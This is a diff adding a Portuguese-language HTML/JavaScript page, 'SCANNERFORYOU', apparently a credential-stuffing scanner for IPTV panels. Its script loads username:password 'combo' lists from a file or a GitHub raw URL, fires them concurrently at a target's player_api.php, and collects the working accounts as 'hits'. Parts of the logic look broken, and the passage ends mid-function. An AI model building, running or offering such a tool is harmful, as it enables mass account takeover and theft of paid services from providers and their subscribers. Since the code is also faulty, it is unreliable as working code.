@@ -1,0 +1,1489 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[SCANNERFORYOU] - Scanner IPTV</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Variáveis CSS para temas configuráveis */
+        :root {
+            --primary-color: #ff00ff;
+            --secondary-color: #00ffff;
+            --tertiary-color: #ffff00;
+            --background-color: #0a0a0a;
+            --surface-color: rgba(20, 20, 20, 0.8);
+            --text-color: #ffffff;
+            --error-color: #ff3366;
+            --success-color: #33ff66;
+            --warning-color: #ffcc00;
+            --animation-speed: 2s;
+            --border-radius: 10px;
+            --transition-speed: 0.3s;
+        }
+        /* Tema claro */
+        [data-theme="light"] {
+            --primary-color: #6a1b9a;
+            --secondary-color: #00796b;
+            --tertiary-color: #f57c00;
+            --background-color: #f5f5f5;
+            --surface-color: rgba(255, 255, 255, 0.9);
+            --text-color: #212121;
+        }
+        /* Tema escuro */
+        [data-theme="dark"] {
+            --primary-color: #9c27b0;
+            --secondary-color: #00bcd4;
+            --tertiary-color: #ffeb3b;
+            --background-color: #121212;
+            --surface-color: rgba(30, 30, 30, 0.9);
+            --text-color: #e0e0e0;
+        }
+        /* Estilos globais */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        /* Efeitos psicodélicos de fundo */
+        .psychedelic-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+            opacity: 0.3;
+        }
+        .light-effect {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(50px);
+            animation: float 20s infinite alternate;
+        }
+        .light1 {
+            width: 300px;
+            height: 300px;
+            background-color: var(--primary-color);
+            top: -50px;
+            left: -50px;
+            animation-duration: 15s;
+        }
+        .light2 {
+            width: 400px;
+            height: 400px;
+            background-color: var(--secondary-color);
+            bottom: -100px;
+            right: -100px;
+            animation-duration: 25s;
+        }
+        .light3 {
+            width: 250px;
+            height: 250px;
+            background-color: var(--tertiary-color);
+            top: 50%;
+            left: 30%;
+            animation-duration: 20s;
+        }
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(50px, 100px) scale(1.2); }
+            50% { transform: translate(100px, -50px) scale(0.8); }
+            75% { transform: translate(-50px, 50px) scale(1.1); }
+            100% { transform: translate(0, 0) scale(1); }
+        }
+        /* Container principal */
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            background-color: var(--surface-color);
+            border-radius: var(--border-radius);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.3);
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* Título animado */
+        .title-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .main-title {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--tertiary-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            animation: flicker 2s infinite alternate;
+            position: relative;
+            display: inline-block;
+        }
+        @keyframes flicker {
+            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 
+                             0 0 20px rgba(255, 0, 255, 0.5),
+                             0 0 30px rgba(0, 255, 255, 0.5);
+            }
+            20%, 24%, 55% {
+                text-shadow: none;
+            }
+        }
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--secondary-color);
+            margin-bottom: 20px;
+        }
+        /* Seletor de tema */
+        .theme-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        .theme-btn {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all var(--transition-speed);
+        }
+        .theme-btn:hover {
+            transform: scale(1.1);
+        }
+        .theme-btn.active {
+            border-color: var(--text-color);
+            box-shadow: 0 0 10px var(--text-color);
+        }
+        .theme-psych {
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00);
+        }
+        .theme-light {
+            background-color: #f5f5f5;
+        }
+        .theme-dark {
+            background-color: #121212;
+        }
+        /* Contador de usuários */
+        .user-counter {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: var(--text-color);
+            padding: 10px 15px;
+            border-radius: var(--border-radius);
+            font-size: 0.9rem;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .user-counter i {
+            color: var(--success-color);
+        }
+        /* Área de propaganda */
+        .ad-container {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            min-height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .ad-placeholder {
+            color: var(--tertiary-color);
+            font-style: italic;
+        }
+        /* Formulário */
+        .form-section {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: all var(--transition-speed);
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(255, 0, 255, 0.3);
+        }
+        .file-input-wrapper {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        .file-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+        }
+        .file-input-label {
+            display: block;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--text-color);
+            font-size: 1rem;
+            cursor: pointer;
+            text-align: center;
+            transition: all var(--transition-speed);
+        }
+        .file-input-label:hover {
+            background-color: rgba(255, 0, 255, 0.2);
+        }
+        .file-name {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--tertiary-color);
+        }
+        /* Botões */
+        .btn {
+            padding: 12px 24px;
+            border-radius: var(--border-radius);
+            border: none;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all var(--transition-speed);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+        .btn:hover::before {
+            left: 100%;
+        }
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+        }
+        .btn-primary:hover {
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.5);
+        }
+        .btn-success {
+            background: linear-gradient(45deg, var(--success-color), #00cc44);
+            color: white;
+        }
+        .btn-success:hover {
+            box-shadow: 0 0 15px rgba(51, 255, 102, 0.5);
+        }
+        .btn-danger {
+            background: linear-gradient(45deg, var(--error-color), #cc0033);
+            color: white;
+        }
+        .btn-danger:hover {
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.5);
+        }
+        .btn-warning {
+            background: linear-gradient(45deg, var(--warning-color), #cc9900);
+            color: white;
+        }
+        .btn-warning:hover {
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.5);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        /* Barra de progresso */
+        .progress-container {
+            margin: 20px 0;
+        }
+        .progress-bar {
+            height: 20px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.3),
+                transparent
+            );
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .progress-text {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--tertiary-color);
+        }
+        /* Estatísticas */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all var(--transition-speed);
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--secondary-color);
+            margin-top: 5px;
+        }
+        /* Resultados */
+        .results-section {
+            margin-top: 30px;
+        }
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .results-title {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+        }
+        .result-item {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            animation: slideIn 0.5s ease-out;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .result-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--primary-color), var(--secondary-color));
+        }
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .result-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--success-color);
+        }
+        .result-actions {
+            display: flex;
+            gap: 10px;
+        }
+        .result-content {
+            font-family: monospace;
+            white-space: pre-wrap;
+            line-height: 1.5;
+            color: var(--text-color);
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            overflow-x: auto;
+        }
+        /* Notificações */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: var(--border-radius);
+            color: white;
+            font-weight: bold;
+            z-index: 1000;
+            transform: translateX(120%);
+            transition: transform 0.3s ease-out;
+            max-width: 300px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        .notification.show {
+            transform: translateX(0);
+        }
+        .notification-success {
+            background: linear-gradient(45deg, var(--success-color), #00cc44);
+        }
+        .notification-error {
+            background: linear-gradient(45deg, var(--error-color), #cc0033);
+        }
+        .notification-warning {
+            background: linear-gradient(45deg, var(--warning-color), #cc9900);
+        }
+        /* Histórico */
+        .history-section {
+            margin-top: 30px;
+        }
+        .history-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .history-title {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+        }
+        .history-item {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 15px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all var(--transition-speed);
+        }
+        .history-item:hover {
+            background-color: rgba(0, 0, 0, 0.3);
+        }
+        .history-date {
+            font-size: 0.9rem;
+            color: var(--tertiary-color);
+        }
+        .history-actions {
+            display: flex;
+            gap: 10px;
+        }
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: var(--surface-color);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .modal-title {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+        }
+        .modal-close {
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--text-color);
+            transition: color var(--transition-speed);
+        }
+        .modal-close:hover {
+            color: var(--error-color);
+        }
+        .modal-body {
+            margin-bottom: 20px;
+        }
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .main-title { font-size: 2rem; }
+            .container { padding: 20px; }
+            .stats-container { grid-template-columns: repeat(2, 1fr); }
+            .btn-group { flex-direction: column; }
+            .btn { width: 100%; }
+            .user-counter {
+                bottom: 10px;
+                left: 10px;
+                padding: 8px 12px;
+                font-size: 0.8rem;
+            }
+        }
+        @media (max-width: 480px) {
+            .stats-container { grid-template-columns: 1fr; }
+            .result-header { flex-direction: column; align-items: flex-start; gap: 10px; }
+            .result-actions { width: 100%; justify-content: space-between; }
+        }
+        /* Animação de digitação */
+        .typing {
+            overflow: hidden;
+            white-space: nowrap;
+            animation: typing var(--animation-speed) steps(40, end);
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+    </style>
+</head>
+<body data-theme="psych">
+    <!-- Efeitos psicodélicos de fundo -->
+    <div class="psychedelic-bg">
+        <div class="light-effect light1"></div>
+        <div class="light-effect light2"></div>
+        <div class="light-effect light3"></div>
+    </div>
+    <!-- Seletor de tema -->
+    <div class="theme-selector">
+        <div class="theme-btn theme-psych active" data-theme="psych" title="Tema Psicodélico"></div>
+        <div class="theme-btn theme-light" data-theme="light" title="Tema Claro"></div>
+        <div class="theme-btn theme-dark" data-theme="dark" title="Tema Escuro"></div>
+    </div>
+    <!-- Container principal -->
+    <div class="container">
+        <!-- Título -->
+        <div class="title-container">
+            <h1 class="main-title typing">[SCANNERFORYOU]</h1>
+            <p class="subtitle">Scanner IPTV Avançado</p>
+        </div>
+        
+        <!-- Área de propaganda -->
+        <div class="ad-container" id="adContainer">
+            <div class="ad-placeholder">
+                <!-- Insira seu código de propaganda aqui -->
+                <!-- Exemplo: <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-XXXXXXXXXXXXXXXX" crossorigin="anonymous"></script> -->
+                <!-- <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-XXXXXXXXXXXXXXXX" data-ad-slot="XXXXXXXXXX" data-ad-format="auto" data-full-width-responsive="true"></ins> -->
+                <!-- <script>(adsbygoogle = window.adsbygoogle || []).push({});</script> -->
+            </div>
+        </div>
+        
+        <!-- Formulário -->
+        <div class="form-section">
+            <div class="form-group">
+                <label for="host">URL do Endpoint/Host:</label>
+                <input type="text" id="host" class="form-control" placeholder="http://exemplo.com" value="http://">
+            </div>
+            <div class="form-group">
+                <label for="threads">Número de Bots Concorrentes (Threads):</label>
+                <input type="number" id="threads" class="form-control" min="1" max="100" value="5">
+            </div>
+            <div class="form-group">
+                <label>Fonte dos Combos:</label>
+                <div class="btn-group">
+                    <button id="loadOnlineBtn" class="btn btn-primary">
+                        <i class="fas fa-cloud-download-alt"></i> Carregar Online
+                    </button>
+                    <div class="file-input-wrapper" style="flex: 1;">
+                        <input type="file" id="comboFile" class="file-input" accept=".txt">
+                        <label for="comboFile" class="file-input-label">
+                            <i class="fas fa-upload"></i> Selecionar Arquivo
+                        </label>
+                    </div>
+                </div>
+                <div class="file-name" id="fileName">Nenhum arquivo selecionado</div>
+            </div>
+            <div class="btn-group">
+                <button id="startBtn" class="btn btn-primary">
+                    <i class="fas fa-play"></i> Iniciar
+                </button>
+                <button id="stopBtn" class="btn btn-danger" disabled>
+                    <i class="fas fa-stop"></i> Parar
+                </button>
+                <button id="clearBtn" class="btn btn-warning">
+                    <i class="fas fa-trash"></i> Limpar
+                </button>
+            </div>
+        </div>
+        <!-- Barra de progresso -->
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+        <!-- Estatísticas -->
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-value" id="totalProcessed">0</div>
+                <div class="stat-label">Total Processado</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="hitsCount">0</div>
+                <div class="stat-label">Hits</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="errorsCount">0</div>
+                <div class="stat-label">Erros</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="reqPerSec">0</div>
+                <div class="stat-label">Req/s</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="activeBots">0</div>
+                <div class="stat-label">Bots Ativos</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="remaining">0</div>
+                <div class="stat-label">Restantes</div>
+            </div>
+        </div>
+        <!-- Resultados -->
+        <div class="results-section">
+            <div class="results-header">
+                <h2 class="results-title">Resultados</h2>
+                <div class="btn-group">
+                    <button id="copyAllBtn" class="btn btn-success" disabled>
+                        <i class="fas fa-copy"></i> Copiar Todos
+                    </button>
+                    <button id="saveAllBtn" class="btn btn-success" disabled>
+                        <i class="fas fa-save"></i> Salvar Todos
+                    </button>
+                </div>
+            </div>
+            <div id="resultsContainer"></div>
+        </div>
+        <!-- Histórico -->
+        <div class="history-section">
+            <div class="history-header">
+                <h2 class="history-title">Histórico</h2>
+                <button id="clearHistoryBtn" class="btn btn-warning">
+                    <i class="fas fa-trash"></i> Limpar Histórico
+                </button>
+            </div>
+            <div id="historyContainer"></div>
+        </div>
+    </div>
+    <!-- Modal -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title" id="modalTitle">Título do Modal</h3>
+                <span class="modal-close" id="modalClose">&times;</span>
+            </div>
+            <div class="modal-body" id="modalBody">
+                Conteúdo do Modal
+            </div>
+            <div class="modal-footer">
+                <button id="modalCancelBtn" class="btn btn-danger">Cancelar</button>
+                <button id="modalConfirmBtn" class="btn btn-success">Confirmar</button>
+            </div>
+        </div>
+    </div>
+    <!-- Notificação -->
+    <div id="notification" class="notification"></div>
+    <!-- Áudio de notificação -->
+    <audio id="notificationSound" preload="auto">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmFgU7k9n1unEiBC13yO/eizEIHWq+8+OWT" type="audio/wav">
+    </audio>
+    
+    <!-- Contador de usuários online -->
+    <div class="user-counter">
+        <i class="fas fa-users"></i>
+        <span>Usuários online: <span id="userCount">0</span></span>
+    </div>
+    
+    <script>
+        // Variáveis globais
+        let isScanning = false;
+        let combos = [];
+        let results = [];
+        let stats = {
+            total: 0,
+            hits: 0,
+            errors: 0,
+            startTime: 0,
+            activeThreads: 0,
+            remaining: 0
+        };
+        let history = JSON.parse(localStorage.getItem('scannerHistory')) || [];
+        let abortController = null;
+        let userCount = 0;
+        
+        // Elementos do DOM
+        const hostInput = document.getElementById('host');
+        const threadsInput = document.getElementById('threads');
+        const comboFileInput = document.getElementById('comboFile');
+        const fileNameDiv = document.getElementById('fileName');
+        const loadOnlineBtn = document.getElementById('loadOnlineBtn');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const totalProcessedEl = document.getElementById('totalProcessed');
+        const hitsCountEl = document.getElementById('hitsCount');
+        const errorsCountEl = document.getElementById('errorsCount');
+        const reqPerSecEl = document.getElementById('reqPerSec');
+        const activeBotsEl = document.getElementById('activeBots');
+        const remainingEl = document.getElementById('remaining');
+        const resultsContainer = document.getElementById('resultsContainer');
+        const copyAllBtn = document.getElementById('copyAllBtn');
+        const saveAllBtn = document.getElementById('saveAllBtn');
+        const historyContainer = document.getElementById('historyContainer');
+        const clearHistoryBtn = document.getElementById('clearHistoryBtn');
+        const modal = document.getElementById('modal');
+        const modalTitle = document.getElementById('modalTitle');
+        const modalBody = document.getElementById('modalBody');
+        const modalClose = document.getElementById('modalClose');
+        const modalCancelBtn = document.getElementById('modalCancelBtn');
+        const modalConfirmBtn = document.getElementById('modalConfirmBtn');
+        const notification = document.getElementById('notification');
+        const notificationSound = document.getElementById('notificationSound');
+        const themeButtons = document.querySelectorAll('.theme-btn');
+        const userCountEl = document.getElementById('userCount');
+        
+        // Event listeners
+        comboFileInput.addEventListener('change', handleFileSelect);
+        loadOnlineBtn.addEventListener('click', loadCombosOnline);
+        startBtn.addEventListener('click', startScanning);
+        stopBtn.addEventListener('click', stopScanning);
+        clearBtn.addEventListener('click', clearResults);
+        copyAllBtn.addEventListener('click', copyAllResults);
+        saveAllBtn.addEventListener('click', saveAllResults);
+        clearHistoryBtn.addEventListener('click', clearHistory);
+        modalClose.addEventListener('click', closeModal);
+        modalCancelBtn.addEventListener('click', closeModal);
+        modalConfirmBtn.addEventListener('click', confirmModalAction);
+        themeButtons.forEach(btn => {
+            btn.addEventListener('click', () => changeTheme(btn.dataset.theme));
+        });
+        
+        // Inicialização
+        function init() {
+            updateStats();
+            renderHistory();
+            updateUserCount();
+            // Atualizar contador de usuários a cada 30 segundos
+            setInterval(updateUserCount, 30000);
+        }
+        
+        // ===== FUNÇÃO PARA CARREGAR COMBOS ONLINE =====
+        async function loadCombosOnline() {
+            try {
+                // URL corrigida para acessar o arquivo raw do GitHub
+                const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
+                if (!response.ok) {
+                    throw new Error(`Erro ao carregar combos: ${response.status}`);
+                }
+                const text = await response.text();
+                let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+                combos = lines.filter(l => l.includes(':')); // mínimo username:password
+                showNotification(`${combos.length} combos carregados online.`, 'success');
+                
+                // Atualizar estatísticas
+                stats.total = combos.length;
+                stats.remaining = combos.length;
+                updateStats();
+                
+                fileNameDiv.textContent = `Carregados online: ${combos.length} combos`;
+                return true;
+            } catch (error) {
+                showNotification(`Erro ao carregar combos: ${error.message}`, 'error');
+                console.error('Erro ao carregar combos:', error);
+                return false;
+            }
+        }
+        
+        // ===== FUNÇÃO PARA CARREGAR COMBOS DE ARQUIVO =====
+        async function loadCombosFromFile(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    try {
+                        const text = e.target.result;
+                        let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+                        const fileCombos = lines.filter(l => l.includes(':')); // mínimo username:password
+                        combos = fileCombos;
+                        showNotification(`${combos.length} combos carregados do arquivo.`, 'success');
+                        
+                        // Atualizar estatísticas
+                        stats.total = combos.length;
+                        stats.remaining = combos.length;
+                        updateStats();
+                        
+                        resolve(true);
+                    } catch (error) {
+                        showNotification(`Erro ao processar arquivo: ${error.message}`, 'error');
+                        reject(error);
+                    }
+                };
+                reader.onerror = function() {
+                    showNotification('Erro ao ler o arquivo.', 'error');
+                    reject(new Error('Erro ao ler o arquivo.'));
+                };
+                reader.readAsText(file);
+            });
+        }
+        
+        // Atualizar contador de usuários online
+        function updateUserCount() {
+            // Simulação de contador de usuários online
+            // Em um ambiente real, você usaria WebSockets ou outra tecnologia em tempo real
+            userCount = Math.floor(Math.random() * 50) + 1;
+            userCountEl.textContent = userCount;
+            
+            // Salvar no localStorage para persistência
+            localStorage.setItem('lastUserCount', userCount);
+            localStorage.setItem('lastUserCountUpdate', new Date().toISOString());
+        }
+        
+        // Manipulação de seleção de arquivo
+        async function handleFileSelect(e) {
+            const file = e.target.files[0];
+            if (file) {
+                fileNameDiv.textContent = file.name;
+                await loadCombosFromFile(file);
+            }
+        }
+        
+        // Iniciar scanner
+        async function startScanning() {
+            const host = hostInput.value.trim();
+            const threads = parseInt(threadsInput.value);
+            
+            if (!host || !host.startsWith('http')) {
+                showNotification('Por favor, insira uma URL válida!', 'error');
+                return;
+            }
+            
+            if (combos.length === 0) {
+                showNotification('Por favor, carregue combos antes de iniciar!', 'error');
+                return;
+            }
+            
+            if (threads < 1 || threads > 100) {
+                showNotification('O número de threads deve estar entre 1 e 100!', 'error');
+                return;
+            }
+            
+            isScanning = true;
+            results = [];
+            stats.hits = 0;
+            stats.errors = 0;
+            stats.startTime = Date.now();
+            stats.activeThreads = threads;
+            stats.remaining = combos.length;
+            
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            copyAllBtn.disabled = true;
+            saveAllBtn.disabled = true;
+            
+            resultsContainer.innerHTML = '';
+            updateStats();
+            
+            abortController = new AbortController();
+            
+            // Criar um pool de threads
+            const threadPool = Array(threads).fill().map(() => processCombo(host));
+            
+            // Processar combos
+            for (const combo of combos) {
+                if (!isScanning) break;
+                
+                // Aguardar uma thread ficar disponível
+                await Promise.race(threadPool);
+                
+                // Iniciar uma nova thread com o combo atual
+                processCombo(host, combo);
+            }
+            
+            // Aguardar todas as threads terminarem
+            await Promise.all(threadPool);
+            
+            if (isScanning) {
+                finishScanning();
+            }
+        }
+        
+        // Processar um combo
+        async function processCombo(host, combo = null) {
+            if (!isScanning || !combo) return;
+            
+            try {
+                stats.activeThreads++;
+                updateStats();
+                
+                const result = await testCombo(host, combo.username, combo.password, abortController.signal);
+                
+                if (result.valid) {
+                    stats.hits++;
+                    results.push(result);
+                    renderResult(result);
+                    
+                    // Adicionar ao histórico
+                    addToHistory(result);
+                    
+                    // Ativar botões de cópia e salvamento
+                    copyAllBtn.disabled = false;
+                    saveAllBtn.disabled = false;
+                }
+            } catch (error) {
+                stats.errors++;
+                console.error('Erro ao processar combo:', error);
+            } finally {
+                stats.total++;
+                stats.remaining--;
+                stats.activeThreads--;
+                updateStats();
+                updateProgress();
+            }
+        }
+        
+        // Testar um combo
+        async function testCombo(host, username, password, signal = null) {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 10000);
+            
+            // Combinar sinais se fornecido
+            if (signal) {
+                signal.addEventListener('abort', () => controller.abort());
+            }
+            
+            try {
+                // Construir a URL do proxy
+                const targetUrl = `${host}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                const proxyUrl = `/api/proxy?url=${encodeURIComponent(targetUrl)}`;
+                
+                const response = await fetch(proxyUrl, {
+                    signal: controller.signal,
+                    headers: { 'Accept': 'application/json' }
+                });
+                
+                clearTimeout(timeout);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.user_info && data.user_info.status === 'Active') {
+                    const expirationDate = data.user_info.exp_date ?
+                        new Date(parseInt(data.user_info.exp_date) * 1000).toLocaleDateString() :
+                        'Desconhecida';
+                    
+                    let counts = { live: 0, movies: 0, series: 0, total: 0 };
+                    
+                    if (data.categories) {
+                        counts.total = data.categories.length;
+                        counts.live = data.categories.filter(cat => 
+                            cat.category_name.toLowerCase().includes('live')).length;
+                        counts.movies = data.categories.filter(cat => 
+                            cat.category_name.toLowerCase().includes('movie')).length;
+                        counts.series = data.categories.filter(cat => 
+                            cat.category_name.toLowerCase().includes('series')).length;
+                    }
+                    
+                    // Obter informações adicionais
+                    const additionalData = await fetchStreamData(host, username, password);
+                    
+                    return {
+                        valid: true,
+                        username: username,
+                        password: password,
+                        host: host,
+                        status: data.user_info.status,
+                        expiration: expirationDate,
